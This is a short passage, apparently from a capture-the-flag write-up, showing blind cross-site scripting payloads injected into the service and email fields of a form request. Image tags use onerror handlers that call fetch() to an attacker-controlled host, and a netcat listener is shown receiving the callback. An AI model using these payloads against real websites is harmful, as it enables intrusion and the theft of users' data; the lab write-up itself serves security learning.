...
service=Carpet+Cleaning&service=Tile+%26+Grout&service=<img src="http://10.10.14.33/invalid" onerror=fetch("http://10.10.14.33/XSS") />&email=<img src="http://10.10.14.33/doesnotexist" onerror=fetch("http://10.10.14.33/1337") />
```
...
rlwrap nc -nlvvkp 80
listening on [any] 80 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.12] 56866
